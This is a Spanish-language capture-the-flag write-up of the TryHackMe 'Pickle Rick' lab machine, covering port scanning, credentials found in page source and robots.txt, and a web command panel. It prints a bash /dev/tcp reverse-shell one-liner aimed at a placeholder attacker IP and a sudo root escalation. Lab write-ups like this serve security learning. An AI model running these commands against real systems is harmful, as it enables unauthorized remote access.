---
title: "Pickle Rick - Try Hack Me"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/PickleRick/data/pickleRick.png?raw=true"
  teaser_home_page: true
  icon: "assets/images/icons/TryHackMe.png"
categories:
  - Writeup
  - TryHackMe
tags:
  - SUID
  - Wordpress
  - Python
  - BruteForce
---

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/PickleRick/data/pickleRickTHMpng.png?raw=true">
</p>

La máquina **Pickle Rick** es una máquina virtual vulnerable de la plataforma **Try Hack Me** con un nivel de dificultad **medio**  desarrollada por **tryhackme** y publicada **10 de marzo del 2019** con un sistema operativo **Linux**.

# Port Scan

  Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.197.4]** utilizando los parámetros:

  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/scanPort.png">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **22 y 80**:  

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/Ports.png">
  </p>


  Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/PortServ.png">
  </p>

  Ya que el escaneo de versiones y servicios no mostró demasiado empezamos a enumerar un poco mas a nivel web así que entre a la pagina ya que cuenta con un servicio **http** por el puerto **80** al entrar pude ver lo siguiente:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/web.png">
  </p>

  Curios curioso vemos que esta hablando que necesita conseguir 3 ingredientes los cuales son las **flags** que buscamos y menciona que perdió una contraseña asi que puede ser una pista para nosotros, enumerando el código fuente de la pagina se puede ver a modo comentado lo siguiente:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/pass.png">
  </p>

  Ahora que tenemos un usuario el cual es **R1ckRul3s** podemos pensar que puede existir un login así que si hacemos enumeración web básica antes de emplear un fuzzing a nivel de rutas podemos probar con el recurso **Robots.txt**:


  En este caso el recurso **Robots.txt** si estaba disponible, recordar que el recursos **Robots.txt** es un recursos que nos muestra rutas existentes a nivel de directorios en las paginas web, la mayoría de las paginas lo deshabilitado ya que es una buena practica en este caso no se deshabilitó y lo podemos usar para encontrar directorios o recursos sin necesidad de hacer fuerza bruta.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/wubba.png">
  </p>

  Vemos que tiene un recurso llamado **"Wubbalubbadubdub"** pero vemos que si entramos por la pagina web a este supuesto subdirectorio nos marca como error 404 el cual indica que no existe, ya que vimos esto intentamos buscar otras formas de encontrar rutas así que si buscamos algo clásico como "login.php" puede y encontremos algo:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/log.png">
  </p>

  Excelente ahora que tenemos un login podemos usar la credencial de usuario que encontramos en el código fuente y ya que lo que encontramos en Robots no fue un directorio lo usaremos como contraseña:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/webcmd.png">
  </p>

# Lateral Movement

  Super bien vemos que tenemos un panel el cual se llama **"Command Panel"** lo que es mas que obvio que es una gran pista, ingresamos un **"whoami"** y vemos que nos responde la maquina como el usuario **"www-data"**

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/whoami.png">
  </p>

  Así que si vemos que tenemos ejecución de comando pues entonces nos daremos una shell.
  Para esto me pondré por el puerto 443 en escucha con el comando ```nc -nlvp 443``` y en la web pondré lo siguiente:

  ```bash
    /bin/bash -c 'bash -i >& /dev/tcp/[Your IP]/443 0>&1'
  ```

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/instrusion/shell1.png">
  </p>

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/instrusion/shell2.png">
  </p>

  Como vemos en nuestra consola ya tenemos acceso a la maquina y vemos que el mismo directorio se encuentra la primer flag y yendo a la ruta /home veo que hay dos usuarios, la carpeta de usuario **rick** se puede encontrar la segunda flag:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/instrusion/flag1.png">
  </p>
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/instrusion/flag2.png">
  </p>

# Privilege escalation

  Ahora es momento de escalar privilegios para eso vemos si el usuario en el que actualmente estamos tiene algún permiso especial a nivel de **sudo** sin proporcionar contraseña eso lo vemos con el comando ```sudo -l```.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/instrusion/sudo.png">
  </p>

  Y sorprendentemente tenemos a nivel de **sudo** si proporcionar contraseña tenemos permisos absolutos así que podemos spawnearnos una shell con el siguiente comando:

  ```bash
  sudo /bin/bash
  ```
  Y como vemos ya somos root en la maquina a si que nos dirigimos al directorio de root y podemos visualizar la ultima flag y así concluyendo esta maquina.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/instrusion/root.png">
  </p>

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/instrusion/flag3.png">
  </p>
